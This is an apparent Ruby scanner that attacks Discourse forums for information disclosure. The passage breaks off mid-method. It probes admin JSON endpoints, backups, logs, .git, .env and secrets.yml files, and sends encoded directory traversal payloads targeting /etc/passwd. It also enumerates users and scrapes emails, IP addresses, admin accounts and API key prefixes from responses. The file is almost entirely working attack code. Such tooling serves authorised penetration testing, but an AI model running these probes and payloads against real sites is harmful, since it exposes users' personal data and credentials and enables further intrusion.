#!/usr/bin/env ruby

require 'net/http'
require 'uri'
require 'json'
require 'base64'
require 'digest'

class DiscourseInfoDisclosure
  def initialize(target_url, options = {})
    @target_url = target_url.chomp('/')
    @proxy = options[:proxy]
    @timeout = options[:timeout] || 10
    @session = {}
    @csrf_token = nil
    
    @results = {
      vulnerable: false,
      vulnerabilities: [],
      summary: {
        total_tests: 0,
        successful_tests: 0,
        critical_vulns: 0,
        high_vulns: 0,
        medium_vulns: 0,
        low_vulns: 0
      },
      target: @target_url,
      timestamp: Time.now.iso8601
    }
    
    extract_csrf_token
  end
  
  def run_all_tests
    puts "\nüîç Starting information disclosure tests on #{@target_url}"
    puts "=" * 60
    
    # Configuration and system information
    test_config_disclosure
    test_system_info_disclosure
    test_version_disclosure
    test_debug_info_disclosure
    
    # User and admin information
    test_user_enumeration
    test_admin_disclosure
    test_email_disclosure
    
    # Database and backup information
    test_database_disclosure
    test_backup_disclosure
    test_log_disclosure
    
    # API and internal endpoints
    test_api_disclosure
    test_internal_endpoints
    test_source_code_disclosure
    
    # File and directory disclosure
    test_file_disclosure
    test_directory_traversal
    test_git_disclosure
    
    # Error and debug disclosure
    test_error_disclosure
    test_stack_trace_disclosure
    
    # Plugin and theme disclosure
    test_plugin_disclosure
    test_theme_disclosure
    
    print_results
    save_results
    
    @results
  end
  
  def test_config_disclosure
    puts "\n[*] Testing configuration disclosure..."
    @results[:summary][:total_tests] += 1
    
    # Test configuration endpoints
    config_endpoints = [
      '/site.json',
      '/site_settings.json',
      '/admin/site_settings.json',
      '/admin/site_settings',
      '/admin/config',
      '/config.json',
      '/settings.json',
      '/admin/dashboard.json',
      '/admin/dashboard/general.json',
      '/admin/dashboard/moderation.json',
      '/admin/dashboard/security.json',
      '/admin/dashboard/reports.json'
    ]
    
    config_endpoints.each do |endpoint|
      response = make_request(URI("#{@target_url}#{endpoint}"), 'GET')
      
      if response && response.code.to_i < 400
        sensitive_data = check_sensitive_config(response.body)
        
        if sensitive_data.any?
          add_vulnerability({
            test_type: 'Configuration Disclosure',
            endpoint: endpoint,
            method: 'GET',
            payload: {},
            severity: determine_config_severity(sensitive_data),
            evidence: sensitive_data,
            description: "Configuration information disclosed: #{sensitive_data.join(', ')}"
          })
        end
      end
    end
  end
  
  def test_system_info_disclosure
    puts "\n[*] Testing system information disclosure..."
    @results[:summary][:total_tests] += 1
    
    # Test system info endpoints
    system_endpoints = [
      '/admin/system',
      '/admin/system.json',
      '/admin/dashboard/problems.json',
      '/admin/dashboard/version_check.json',
      '/admin/upgrade',
      '/admin/upgrade.json',
      '/admin/docker',
      '/admin/docker.json',
      '/health',
      '/health.json',
      '/srv/status',
      '/status',
      '/status.json',
      '/admin/logs/staff_action_logs.json',
      '/admin/logs/screened_emails.json',
      '/admin/logs/screened_ip_addresses.json'
    ]
    
    system_endpoints.each do |endpoint|
      response = make_request(URI("#{@target_url}#{endpoint}"), 'GET')
      
      if response && response.code.to_i < 400
        system_info = check_system_info(response.body)
        
        if system_info.any?
          add_vulnerability({
            test_type: 'System Information Disclosure',
            endpoint: endpoint,
            method: 'GET',
            payload: {},
            severity: 'Medium',
            evidence: system_info,
            description: "System information disclosed: #{system_info.join(', ')}"
          })
        end
      end
    end
  end
  
  def test_version_disclosure
    puts "\n[*] Testing version disclosure..."
    @results[:summary][:total_tests] += 1
    
    # Test version endpoints
    version_endpoints = [
      '/admin/upgrade.json',
      '/admin/dashboard/version_check.json',
      '/about.json',
      '/site.json'
    ]
    
    version_endpoints.each do |endpoint|
      response = make_request(URI("#{@target_url}#{endpoint}"), 'GET')
      
      if response && response.code.to_i < 400
        version_info = extract_version_info(response.body)
        
        if version_info.any?
          add_vulnerability({
            test_type: 'Version Disclosure',
            endpoint: endpoint,
            method: 'GET',
            payload: {},
            severity: 'Low',
            evidence: version_info,
            description: "Version information disclosed: #{version_info.join(', ')}"
          })
        end
      end
    end
    
    # Check HTTP headers for version info
    response = make_request(URI(@target_url), 'GET')
    if response
      version_headers = check_version_headers(response)
      if version_headers.any?
        add_vulnerability({
          test_type: 'Version Disclosure',
          endpoint: '/',
          method: 'GET',
          payload: {},
          severity: 'Low',
          evidence: version_headers,
          description: "Version information in headers: #{version_headers.join(', ')}"
        })
      end
    end
  end
  
  def test_debug_info_disclosure
    puts "\n[*] Testing debug information disclosure..."
    @results[:summary][:total_tests] += 1
    
    # Test debug endpoints
    debug_endpoints = [
      '/debug',
      '/debug.json',
      '/admin/logs',
      '/admin/logs.json',
      '/admin/logs/staff_action_logs',
      '/admin/logs/staff_action_logs.json',
      '/admin/logs/screened_emails',
      '/admin/logs/screened_ip_addresses',
      '/logs',
      '/logs.json',
      '/error_log',
      '/access_log',
      '/rails/info',
      '/rails/info/routes',
      '/rails/info/properties'
    ]
    
    debug_endpoints.each do |endpoint|
      response = make_request(URI("#{@target_url}#{endpoint}"), 'GET')
      
      if response && response.code.to_i < 400
        debug_info = check_debug_info(response.body)
        
        if debug_info.any?
          add_vulnerability({
            test_type: 'Debug Information Disclosure',
            endpoint: endpoint,
            method: 'GET',
            payload: {},
            severity: 'Medium',
            evidence: debug_info,
            description: "Debug information disclosed: #{debug_info.join(', ')}"
          })
        end
      end
    end
  end
  
  def test_user_enumeration
    puts "\n[*] Testing user enumeration..."
    @results[:summary][:total_tests] += 1
    
    # Test user enumeration endpoints
    user_endpoints = [
      '/users.json',
      '/admin/users.json',
      '/admin/users/list.json',
      '/admin/users/list/active.json',
      '/admin/users/list/staff.json',
      '/admin/users/list/suspended.json',
      '/admin/users/list/new.json',
      '/directory_items.json',
      '/groups.json',
      '/admin/groups.json'
    ]
    
    user_endpoints.each do |endpoint|
      response = make_request(URI("#{@target_url}#{endpoint}"), 'GET')
      
      if response && response.code.to_i < 400
        user_data = extract_user_data(response.body)
        
        if user_data.any?
          add_vulnerability({
            test_type: 'User Enumeration',
            endpoint: endpoint,
            method: 'GET',
            payload: {},
            severity: 'Medium',
            evidence: user_data,
            description: "User information disclosed: #{user_data.length} users found"
          })
        end
      end
    end
    
    # Test individual user profiles
    test_user_ids = [1, 2, 3, 4, 5]
    test_user_ids.each do |user_id|
      response = make_request(URI("#{@target_url}/users/#{user_id}.json"), 'GET')
      
      if response && response.code.to_i < 400
        user_info = extract_individual_user_data(response.body)
        
        if user_info.any?
          add_vulnerability({
            test_type: 'User Profile Disclosure',
            endpoint: "/users/#{user_id}.json",
            method: 'GET',
            payload: {},
            severity: 'Low',
            evidence: user_info,
            description: "User profile information disclosed for user ID #{user_id}"
          })
        end
      end
    end
  end
  
  def test_admin_disclosure
    puts "\n[*] Testing admin information disclosure..."
    @results[:summary][:total_tests] += 1
    
    # Test admin endpoints
    admin_endpoints = [
      '/admin.json',
      '/admin/dashboard.json',
      '/admin/users/list/staff.json',
      '/admin/users/list/admins.json',
      '/admin/users/list/moderators.json',
      '/admin/api.json',
      '/admin/api/keys.json',
      '/admin/customize.json',
      '/admin/customize/themes.json',
      '/admin/plugins.json'
    ]
    
    admin_endpoints.each do |endpoint|
      response = make_request(URI("#{@target_url}#{endpoint}"), 'GET')
      
      if response && response.code.to_i < 400
        admin_data = extract_admin_data(response.body)
        
        if admin_data.any?
          add_vulnerability({
            test_type: 'Admin Information Disclosure',
            endpoint: endpoint,
            method: 'GET',
            payload: {},
            severity: 'High',
            evidence: admin_data,
            description: "Admin information disclosed: #{admin_data.join(', ')}"
          })
        end
      end
    end
  end
  
  def test_email_disclosure
    puts "\n[*] Testing email disclosure..."
    @results[:summary][:total_tests] += 1
    
    # Test email endpoints
    email_endpoints = [
      '/admin/email.json',
      '/admin/email/sent.json',
      '/admin/email/skipped.json',
      '/admin/email/bounced.json',
      '/admin/email/received.json',
      '/admin/email/rejected.json',
      '/admin/logs/screened_emails.json',
      '/admin/customize/email_templates.json'
    ]
    
    email_endpoints.each do |endpoint|
      response = make_request(URI("#{@target_url}#{endpoint}"), 'GET')
      
      if response && response.code.to_i < 400
        email_data = extract_email_data(response.body)
        
        if email_data.any?
          add_vulnerability({
            test_type: 'Email Information Disclosure',
            endpoint: endpoint,
            method: 'GET',
            payload: {},
            severity: 'Medium',
            evidence: email_data,
            description: "Email information disclosed: #{email_data.join(', ')}"
          })
        end
      end
    end
  end
  
  def test_database_disclosure
    puts "\n[*] Testing database information disclosure..."
    @results[:summary][:total_tests] += 1
    
    # Test database endpoints
    db_endpoints = [
      '/admin/backups.json',
      '/admin/backups/logs.json',
      '/admin/backups/status.json',
      '/admin/dashboard/general.json',
      '/admin/reports.json',
      '/admin/reports/posts.json',
      '/admin/reports/topics.json',
      '/admin/reports/users.json'
    ]
    
    db_endpoints.each do |endpoint|
      response = make_request(URI("#{@target_url}#{endpoint}"), 'GET')
      
      if response && response.code.to_i < 400
        db_data = extract_database_data(response.body)
        
        if db_data.any?
          add_vulnerability({
            test_type: 'Database Information Disclosure',
            endpoint: endpoint,
            method: 'GET',
            payload: {},
            severity: 'High',
            evidence: db_data,
            description: "Database information disclosed: #{db_data.join(', ')}"
          })
        end
      end
    end
  end
  
  def test_backup_disclosure
    puts "\n[*] Testing backup file disclosure..."
    @results[:summary][:total_tests] += 1
    
    # Test backup file paths
    backup_paths = [
      '/backups/',
      '/backup/',
      '/admin/backups/',
      '/uploads/backups/',
      '/public/backups/',
      '/var/discourse/backups/',
      '/shared/backups/',
      '/backup.sql',
      '/backup.tar.gz',
      '/backup.zip',
      '/discourse_backup.tar.gz',
      '/site_backup.sql',
      '/database.sql',
      '/dump.sql'
    ]
    
    backup_paths.each do |path|
      response = make_request(URI("#{@target_url}#{path}"), 'GET')
      
      if response && (response.code.to_i < 400 || response.code.to_i == 403)
        if response.code.to_i < 400 || response.body.include?('backup') || response.body.include?('sql')
          add_vulnerability({
            test_type: 'Backup File Disclosure',
            endpoint: path,
            method: 'GET',
            payload: {},
            severity: 'Critical',
            evidence: ["Response code: #{response.code}", 'Backup file accessible'],
            description: "Backup file potentially accessible: #{path}"
          })
        end
      end
    end
  end
  
  def test_log_disclosure
    puts "\n[*] Testing log file disclosure..."
    @results[:summary][:total_tests] += 1
    
    # Test log file paths
    log_paths = [
      '/logs/',
      '/log/',
      '/var/log/',
      '/var/discourse/log/',
      '/shared/log/',
      '/logs/production.log',
      '/logs/unicorn.stderr.log',
      '/logs/unicorn.stdout.log',
      '/logs/rails.log',
      '/logs/sidekiq.log',
      '/logs/nginx.access.log',
      '/logs/nginx.error.log',
      '/log/production.log',
      '/log/development.log',
      '/log/test.log',
      '/error.log',
      '/access.log',
      '/debug.log'
    ]
    
    log_paths.each do |path|
      response = make_request(URI("#{@target_url}#{path}"), 'GET')
      
      if response && (response.code.to_i < 400 || response.code.to_i == 403)
        if response.code.to_i < 400 || response.body.include?('log') || response.body.include?('error')
          add_vulnerability({
            test_type: 'Log File Disclosure',
            endpoint: path,
            method: 'GET',
            payload: {},
            severity: 'Medium',
            evidence: ["Response code: #{response.code}", 'Log file accessible'],
            description: "Log file potentially accessible: #{path}"
          })
        end
      end
    end
  end
  
  def test_api_disclosure
    puts "\n[*] Testing API information disclosure..."
    @results[:summary][:total_tests] += 1
    
    # Test API endpoints
    api_endpoints = [
      '/admin/api.json',
      '/admin/api/keys.json',
      '/admin/api/web_hooks.json',
      '/api/v1/',
      '/api/v2/',
      '/api/',
      '/api.json',
      '/swagger.json',
      '/openapi.json',
      '/api-docs',
      '/api-docs.json',
      '/docs',
      '/docs.json'
    ]
    
    api_endpoints.each do |endpoint|
      response = make_request(URI("#{@target_url}#{endpoint}"), 'GET')
      
      if response && response.code.to_i < 400
        api_data = extract_api_data(response.body)
        
        if api_data.any?
          add_vulnerability({
            test_type: 'API Information Disclosure',
            endpoint: endpoint,
            method: 'GET',
            payload: {},
            severity: 'Medium',
            evidence: api_data,
            description: "API information disclosed: #{api_data.join(', ')}"
          })
        end
      end
    end
  end
  
  def test_internal_endpoints
    puts "\n[*] Testing internal endpoint disclosure..."
    @results[:summary][:total_tests] += 1
    
    # Test internal endpoints
    internal_endpoints = [
      '/admin/dashboard/problems.json',
      '/admin/dashboard/version_check.json',
      '/admin/dashboard/general.json',
      '/admin/dashboard/moderation.json',
      '/admin/dashboard/security.json',
      '/admin/dashboard/reports.json',
      '/admin/site_settings.json',
      '/admin/customize/themes.json',
      '/admin/customize/colors.json',
      '/admin/customize/css_html.json',
      '/admin/customize/email_templates.json',
      '/admin/plugins.json',
      '/admin/users/list/active.json',
      '/admin/users/list/new.json',
      '/admin/users/list/staff.json',
      '/admin/users/list/suspended.json',
      '/admin/users/list/blocked.json'
    ]
    
    internal_endpoints.each do |endpoint|
      response = make_request(URI("#{@target_url}#{endpoint}"), 'GET')
      
      if response && response.code.to_i < 400
        internal_data = extract_internal_data(response.body)
        
        if internal_data.any?
          add_vulnerability({
            test_type: 'Internal Endpoint Disclosure',
            endpoint: endpoint,
            method: 'GET',
            payload: {},
            severity: 'Medium',
            evidence: internal_data,
            description: "Internal endpoint accessible: #{endpoint}"
          })
        end
      end
    end
  end
  
  def test_source_code_disclosure
    puts "\n[*] Testing source code disclosure..."
    @results[:summary][:total_tests] += 1
    
    # Test source code paths
    source_paths = [
      '/.git/',
      '/.git/config',
      '/.git/HEAD',
      '/.git/logs/HEAD',
      '/.git/refs/heads/master',
      '/.svn/',
      '/.svn/entries',
      '/.hg/',
      '/.bzr/',
      '/Gemfile',
      '/Gemfile.lock',
      '/config.ru',
      '/Rakefile',
      '/app/',
      '/config/',
      '/lib/',
      '/vendor/',
      '/tmp/',
      '/log/',
      '/public/',
      '/assets/',
      '/uploads/',
      '/.env',
      '/.env.local',
      '/.env.production',
      '/config/database.yml',
      '/config/secrets.yml',
      '/config/application.yml'
    ]
    
    source_paths.each do |path|
      response = make_request(URI("#{@target_url}#{path}"), 'GET')
      
      if response && (response.code.to_i < 400 || response.code.to_i == 403)
        if check_source_code_indicators(response)
          add_vulnerability({
            test_type: 'Source Code Disclosure',
            endpoint: path,
            method: 'GET',
            payload: {},
            severity: 'High',
            evidence: ["Response code: #{response.code}", 'Source code indicators found'],
            description: "Source code potentially accessible: #{path}"
          })
        end
      end
    end
  end
  
  def test_file_disclosure
    puts "\n[*] Testing sensitive file disclosure..."
    @results[:summary][:total_tests] += 1
    
    # Test sensitive file paths
    sensitive_files = [
      '/robots.txt',
      '/sitemap.xml',
      '/crossdomain.xml',
      '/clientaccesspolicy.xml',
      '/humans.txt',
      '/security.txt',
      '/.well-known/security.txt',
      '/phpinfo.php',
      '/info.php',
      '/test.php',
      '/readme.txt',
      '/README.md',
      '/CHANGELOG.md',
      '/LICENSE',
      '/VERSION',
      '/INSTALL',
      '/TODO',
      '/package.json',
      '/composer.json',
      '/bower.json',
      '/yarn.lock',
      '/package-lock.json'
    ]
    
    sensitive_files.each do |file|
      response = make_request(URI("#{@target_url}#{file}"), 'GET')
      
      if response && response.code.to_i < 400
        file_data = extract_file_data(response.body, file)
        
        if file_data.any?
          add_vulnerability({
            test_type: 'Sensitive File Disclosure',
            endpoint: file,
            method: 'GET',
            payload: {},
            severity: determine_file_severity(file),
            evidence: file_data,
            description: "Sensitive file accessible: #{file}"
          })
        end
      end
    end
  end
  
  def test_directory_traversal
    puts "\n[*] Testing directory traversal disclosure..."
    @results[:summary][:total_tests] += 1
    
    # Test directory traversal payloads
    traversal_payloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '..%252f..%252f..%252fetc%252fpasswd',
      '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd'
    ]
    
    # Test various endpoints with traversal
    test_endpoints = [
      '/uploads/',
      '/assets/',
      '/public/',
      '/files/',
      '/download/',
      '/export/',
      '/backup/'
    ]
    
    test_endpoints.each do |endpoint|
      traversal_payloads.each do |payload|
        response = make_request(URI("#{@target_url}#{endpoint}#{payload}"), 'GET')
        
        if response && response.code.to_i < 400
          if check_traversal_success(response.body)
            add_vulnerability({
              test_type: 'Directory Traversal',
              endpoint: "#{endpoint}#{payload}",
              method: 'GET',
              payload: { traversal: payload },
              severity: 'High',
              evidence: ['Directory traversal successful'],
              description: "Directory traversal possible: #{endpoint}"
            })
          end
        end
      end
    end
  end
  
  def test_git_disclosure
    puts "\n[*] Testing Git repository disclosure..."
    @results[:summary][:total_tests] += 1
    
    # Test Git paths
    git_paths = [
      '/.git/',
      '/.git/config',
      '/.git/HEAD',
      '/.git/index',
      '/.git/logs/HEAD',
      '/.git/refs/heads/master',
      '/.git/refs/heads/main',
      '/.git/objects/',
      '/.git/description',
      '/.git/hooks/',
      '/.git/info/refs',
      '/.git/packed-refs'
    ]
    
    git_paths.each do |path|
      response = make_request(URI("#{@target_url}#{path}"), 'GET')
      
      if response && (response.code.to_i < 400 || response.code.to_i == 403)
        if check_git_indicators(response)
          add_vulnerability({
            test_type: 'Git Repository Disclosure',
            endpoint: path,
            method: 'GET',
            payload: {},
            severity: 'High',
            evidence: ["Response code: #{response.code}", 'Git repository indicators found'],
            description: "Git repository potentially accessible: #{path}"
          })
        end
      end
    end
  end
  
  def test_error_disclosure
    puts "\n[*] Testing error information disclosure..."
    @results[:summary][:total_tests] += 1
    
    # Test error-inducing requests
    error_tests = [
      { endpoint: '/nonexistent', method: 'GET' },
      { endpoint: '/admin/nonexistent', method: 'GET' },
      { endpoint: '/users/999999', method: 'GET' },
      { endpoint: '/topics/999999', method: 'GET' },
      { endpoint: '/categories/999999', method: 'GET' },
      { endpoint: '/search', method: 'POST', data: { q: "'\"<>" } },
      { endpoint: '/session', method: 'POST', data: { login: "'\"<>" } }
    ]
    
    error_tests.each do |test|
      response = if test[:data]
        make_post_request("#{@target_url}#{test[:endpoint]}", test[:data])
      else
        make_request(URI("#{@target_url}#{test[:endpoint]}"), test[:method])
      end
      
      if response && response.code.to_i >= 400
        error_data = extract_error_data(response.body)
        
        if error_data.any?
          add_vulnerability({
            test_type: 'Error Information Disclosure',
            endpoint: test[:endpoint],
            method: test[:method],
            payload: test[:data] || {},
            severity: 'Low',
            evidence: error_data,
            description: "Error information disclosed: #{error_data.join(', ')}"
          })
        end
      end
    end
  end
  
  def test_stack_trace_disclosure
    puts "\n[*] Testing stack trace disclosure..."
    @results[:summary][:total_tests] += 1
    
    # Test stack trace inducing requests
    stack_trace_tests = [
      { endpoint: '/admin/api', method: 'POST', data: { invalid: 'data' } },
      { endpoint: '/users', method: 'POST', data: { email: 'invalid' } },
      { endpoint: '/topics', method: 'POST', data: { title: nil } },
      { endpoint: '/uploads', method: 'POST', data: { file: 'invalid' } }
    ]
    
    stack_trace_tests.each do |test|
      response = make_post_request("#{@target_url}#{test[:endpoint]}", test[:data])
      
      if response && response.code.to_i >= 400
        if check_stack_trace(response.body)
          add_vulnerability({
            test_type: 'Stack Trace Disclosure',
            endpoint: test[:endpoint],
            method: test[:method],
            payload: test[:data],
            severity: 'Medium',
            evidence: ['Stack trace found in response'],
            description: "Stack trace disclosed: #{test[:endpoint]}"
          })
        end
      end
    end
  end
  
  def test_plugin_disclosure
    puts "\n[*] Testing plugin information disclosure..."
    @results[:summary][:total_tests] += 1
    
    # Test plugin endpoints
    plugin_endpoints = [
      '/admin/plugins.json',
      '/admin/plugins',
      '/plugins/',
      '/plugins.json'
    ]
    
    plugin_endpoints.each do |endpoint|
      response = make_request(URI("#{@target_url}#{endpoint}"), 'GET')
      
      if response && response.code.to_i < 400
        plugin_data = extract_plugin_data(response.body)
        
        if plugin_data.any?
          add_vulnerability({
            test_type: 'Plugin Information Disclosure',
            endpoint: endpoint,
            method: 'GET',
            payload: {},
            severity: 'Low',
            evidence: plugin_data,
            description: "Plugin information disclosed: #{plugin_data.length} plugins found"
          })
        end
      end
    end
  end
  
  def test_theme_disclosure
    puts "\n[*] Testing theme information disclosure..."
    @results[:summary][:total_tests] += 1
    
    # Test theme endpoints
    theme_endpoints = [
      '/admin/customize/themes.json',
      '/admin/customize/themes',
      '/admin/customize/colors.json',
      '/admin/customize/css_html.json',
      '/stylesheets/',
      '/theme-javascripts/',
      '/uploads/stylesheets/'
    ]
    
    theme_endpoints.each do |endpoint|
      response = make_request(URI("#{@target_url}#{endpoint}"), 'GET')
      
      if response && response.code.to_i < 400
        theme_data = extract_theme_data(response.body)
        
        if theme_data.any?
          add_vulnerability({
            test_type: 'Theme Information Disclosure',
            endpoint: endpoint,
            method: 'GET',
            payload: {},
            severity: 'Low',
            evidence: theme_data,
            description: "Theme information disclosed: #{theme_data.join(', ')}"
          })
        end
      end
    end
  end
  
  # Helper methods for data extraction
  def check_sensitive_config(body)
    sensitive_indicators = []
    
    # Check for sensitive configuration
    sensitive_patterns = [
      /database.*password/i,
      /secret.*key/i,
      /api.*key/i,
      /smtp.*password/i,
      /redis.*password/i,
      /s3.*secret/i,
      /aws.*secret/i,
      /google.*secret/i,
      /facebook.*secret/i,
      /twitter.*secret/i,
      /github.*secret/i,
      /oauth.*secret/i,
      /jwt.*secret/i,
      /encryption.*key/i,
      /private.*key/i
    ]
    
    sensitive_patterns.each do |pattern|
      if body.match(pattern)
        sensitive_indicators << pattern.source
      end
    end
    
    sensitive_indicators
  end
  
  def check_system_info(body)
    system_indicators = []
    
    # Check for system information
    system_patterns = [
      /version.*\d+\.\d+/i,
      /ruby.*\d+\.\d+/i,
      /rails.*\d+\.\d+/i,
      /postgres.*\d+\.\d+/i,
      /redis.*\d+\.\d+/i,
      /nginx.*\d+\.\d+/i,
      /ubuntu.*\d+\.\d+/i,
      /debian.*\d+/i,
      /centos.*\d+/i,
      /docker.*\d+\.\d+/i,
      /sidekiq.*\d+\.\d+/i,
      /unicorn.*\d+\.\d+/i
    ]
    
    system_patterns.each do |pattern|
      if body.match(pattern)
        system_indicators << pattern.source
      end
    end
    
    system_indicators
  end
  
  def extract_version_info(body)
    version_info = []
    
    begin
      if body.include?('{') && body.include?('}')
        data = JSON.parse(body)
        
        # Extract version information
        version_fields = ['version', 'discourse_version', 'git_version', 'build']
        version_fields.each do |field|
          if data[field]
            version_info << "#{field}: #{data[field]}"
          end
        end
      end
    rescue JSON::ParserError
      # Check for version patterns in HTML/text
      version_patterns = [
        /discourse.*version.*([\d\.]+)/i,
        /version.*([\d\.]+)/i,
        /v([\d\.]+)/i
      ]
      
      version_patterns.each do |pattern|
        if match = body.match(pattern)
          version_info << "Version: #{match[1]}"
        end
      end
    end
    
    version_info
  end
  
  def check_version_headers(response)
    version_headers = []
    
    # Check common version headers
    version_header_names = [
      'Server',
      'X-Powered-By',
      'X-Runtime',
      'X-Version',
      'X-Discourse-Version',
      'X-Frame-Options',
      'X-Content-Type-Options'
    ]
    
    version_header_names.each do |header|
      if response[header]
        version_headers << "#{header}: #{response[header]}"
      end
    end
    
    version_headers
  end
  
  def check_debug_info(body)
    debug_indicators = []
    
    # Check for debug information
    debug_patterns = [
      /debug.*true/i,
      /development.*mode/i,
      /stack.*trace/i,
      /backtrace/i,
      /exception/i,
      /error.*log/i,
      /sql.*query/i,
      /database.*error/i,
      /rails.*error/i,
      /ruby.*error/i
    ]
    
    debug_patterns.each do |pattern|
      if body.match(pattern)
        debug_indicators << pattern.source
      end
    end
    
    debug_indicators
  end
  
  def extract_user_data(body)
    user_data = []
    
    begin
      if body.include?('{') && body.include?('}')
        data = JSON.parse(body)
        
        # Extract user information
        if data['users'] && data['users'].is_a?(Array)
          data['users'].each do |user|
            if user['username']
              user_data << user['username']
            end
          end
        elsif data['directory_items'] && data['directory_items'].is_a?(Array)
          data['directory_items'].each do |item|
            if item['user'] && item['user']['username']
              user_data << item['user']['username']
            end
          end
        end
      end
    rescue JSON::ParserError
      # Extract usernames from HTML
      username_pattern = /username["']?\s*[:=]\s*["']([^"']+)["']/i
      body.scan(username_pattern) do |match|
        user_data << match[0]
      end
    end
    
    user_data.uniq
  end
  
  def extract_individual_user_data(body)
    user_info = []
    
    begin
      if body.include?('{') && body.include?('}')
        data = JSON.parse(body)
        
        # Extract sensitive user information
        sensitive_fields = ['email', 'ip_address', 'registration_ip_address', 'api_key']
        sensitive_fields.each do |field|
          if data['user'] && data['user'][field]
            user_info << "#{field}: #{data['user'][field]}"
          end
        end
      end
    rescue JSON::ParserError
      # Check for email patterns
      email_pattern = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/
      emails = body.scan(email_pattern)
      emails.each do |email|
        user_info << "email: #{email}"
      end
    end
    
    user_info
  end
  
  def extract_admin_data(body)
    admin_data = []
    
    begin
      if body.include?('{') && body.include?('}')
        data = JSON.parse(body)
        
        # Extract admin information
        if data['users'] && data['users'].is_a?(Array)
          admin_users = data['users'].select { |u| u['admin'] || u['moderator'] }
          admin_users.each do |user|
            admin_data << "#{user['username']} (#{user['admin'] ? 'admin' : 'moderator'})"
          end
        end
        
        # Extract API keys
        if data['keys'] && data['keys'].is_a?(Array)
          data['keys'].each do |key|
            admin_data << "API Key: #{key['key'][0..10]}..."
          end
        end
      end
    rescue JSON::ParserError
      # Check for admin patterns
      admin_patterns = [
        /admin.*true/i,
        /moderator.*true/i,
        /staff.*true/i
      ]
      
      admin_patterns.each do |pattern|
        if body.match(pattern)
          admin_data << pattern.source
        end
      end
    end
    
    admin_data
  end
  
  def extract_email_data(body)
    email_data = []
    
    begin
      if body.include?('{') && body.include?('}')
        data = JSON.parse(body)
        
        # Extract email information
        if data['email_logs'] && data['email_logs'].is_a?(Array)
          data['email_logs'].each do |log|
            if log['to_address']
              email_data << "to: #{log['to_address']}"
            end
            if log['subject']
              email_data << "subject: #{log['subject']}"
            end
          end
        end
      end
    rescue JSON::ParserError
      # Extract email addresses
      email_pattern = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/
      emails = body.scan(email_pattern)
      emails.each do |email|
        email_data << email
      end
    end
    
    email_data.uniq
  end
  
  def extract_database_data(body)
    db_data = []
    
    # Check for database information
    db_patterns = [
      /database.*name/i,
      /table.*name/i,
      /sql.*query/i,
      /postgres/i,
      /mysql/i,
      /sqlite/i,
      /mongodb/i,
      /redis/i
    ]
    
    db_patterns.each do |pattern|
      if body.match(pattern)
        db_data << pattern.source
      end
    end
    
    db_data
  end
  
  def extract_api_data(body)
    api_data = []
    
    begin
      if body.include?('{') && body.include?('}')
        data = JSON.parse(body)
        
        # Extract API information
        if data['keys'] && data['keys'].is_a?(Array)
          api_data << "#{data['keys'].length} API keys found"
        end
        
        if data['webhooks'] && data['webhooks'].is_a?(Array)
          api_data << "#{data['webhooks'].length} webhooks found"
        end
      end
    rescue JSON::ParserError
      # Check for API patterns
      api_patterns = [
        /api.*key/i,
        /access.*token/i,
        /bearer.*token/i,
        /oauth.*token/i,
        /jwt.*token/i
      ]
      
      api_patterns.each do |pattern|
        if body.match(pattern)
          api_data << pattern.source
        end
      end
    end
    
    api_data
  end
  
  def extract_internal_data(body)
    internal_data = []
    
    begin
      if body.include?('{') && body.include?('}')
        data = JSON.parse(body)
        
        # Check if we got internal data
        if data.is_a?(Hash) && !data.empty?
          internal_data << 'Internal endpoint accessible'
          
          # Count data items
          data.each do |key, value|
            if value.is_a?(Array)
              internal_data << "#{key}: #{value.length} items"
            elsif value.is_a?(Hash)
              internal_data << "#{key}: object data"
            end
          end
        end
      end
    rescue JSON::ParserError
      if body.length > 100 && !body.include?('login') && !body.include?('error')
        internal_data << 'Internal content accessible'
      end
    end
    
    internal_data
  end
  
  def check_source_code_indicators(response)
    return false unless response && response.body
    
    # Check for source code indicators
    source_indicators = [
      /class.*<.*ApplicationController/i,
      /def.*index/i,
      /require.*rails/i,
      /gem.*['"].*['"]/i,
      /Rails\.application/i,
      /ActiveRecord/i,
      /ActionController/i,
      /config\..*=/i,
      /database.*yml/i,
      /secrets.*yml/i
    ]
    
    source_indicators.any? { |pattern| response.body.match(pattern) }
  end
  
  def extract_file_data(body, filename)
    file_data = []
    
    case filename
    when '/robots.txt'
      if body.include?('Disallow:')
        disallowed = body.scan(/Disallow:\s*(.+)/).flatten
        file_data.concat(disallowed)
      end
    when '/package.json', '/composer.json'
      begin
        data = JSON.parse(body)
        if data['dependencies']
          file_data << "#{data['dependencies'].keys.length} dependencies"
        end
        if data['name']
          file_data << "Project: #{data['name']}"
        end
      rescue JSON::ParserError
      end
    else
      if body.length > 0
        file_data << "File accessible (#{body.length} bytes)"
      end
    end
    
    file_data
  end
  
  def check_traversal_success(body)
    # Check for successful directory traversal
    traversal_indicators = [
      /root:.*:0:0:/,
      /bin\/bash/,
      /etc\/passwd/,
      /\[boot loader\]/,
      /\[operating systems\]/,
      /Windows Registry/,
      /HKEY_LOCAL_MACHINE/
    ]
    
    traversal_indicators.any? { |pattern| body.match(pattern) }
  end
  
  def check_git_indicators(response)
    return false unless response
    
    # Check for Git repository indicators
    if response.code.to_i < 400
      git_indicators = [
        /ref:\s*refs\/heads/,
        /\[core\]/,
        /repositoryformatversion/,
        /bare\s*=\s*false/,
        /\[remote/,
        /\[branch/
      ]
      
      return git_indicators.any? { |pattern| response.body.match(pattern) }
    elsif response.code.to_i == 403
      # 403 might indicate Git directory exists but is protected
      return response.body.include?('git') || response.body.include?('repository')
    end
    
    false
  end
  
  def extract_error_data(body)
    error_data = []
    
    # Check for error information
    error_patterns = [
      /ActiveRecord::[A-Za-z]+/,
      /NoMethodError/,
      /NameError/,
      /ArgumentError/,
      /RuntimeError/,
      /SyntaxError/,
      /LoadError/,
      /StandardError/,
      /Exception/,
      /\/.+\.rb:\d+/,
      /app\/.*\.rb:\d+/,
      /lib\/.*\.rb:\d+/,
      /config\/.*\.rb:\d+/,
      /vendor\/.*\.rb:\d+/
    ]
    
    error_patterns.each do |pattern|
      matches = body.scan(pattern)
      matches.each do |match|
        error_data << match
